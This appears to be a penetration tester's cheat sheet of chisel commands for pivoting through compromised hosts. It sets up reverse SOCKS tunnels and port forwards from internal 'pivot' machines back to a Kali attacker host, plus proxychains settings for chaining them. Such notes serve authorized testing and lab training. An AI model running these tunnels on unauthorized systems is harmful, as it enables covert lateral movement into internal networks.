chisel

172.16.40.5
./chisel_amd64 server -p 5555 --reverse &
10.90.60.80
./chisel client 172.16.40.5:5555 R:socks &
************************************************************
SPECIFIC PORT FORWARDING
1Pivot 10.90.60.80:
chisel server -p 8888 -reverse
2Pivot 10.185.10.34
chisel client 10.90.60.80:8888 R:9001:10.185.11.127:80
kali 172.16.40.5
chisel server -p 8000 -reverse
1Pivot 10.90.60.80
chisel client 172.16.40.5:8000 R:8001:127.0.0.1:9001
************************************************************
************************************************************
DYNAMIC PORT FORWARDING
Kali - 172.16.40.5
./chisel_amd64 server --socks5 -p 9001 --reverse &
1Pivot - 10.90.60.80
./chisel_386 client 172.16.40.5:9001 R:9999:socks &
./chisel_386 server --socks5 -p 9002 --reverse &
2Pivot - 10.185.10.34
.\chisel.exe client 10.90.60.80:9002 R:9998:socks
Kali
Modify proxychains to have the following:
socks5 127.0.0.1 9999
socks5 127.0.0.1 9998
************************************************************
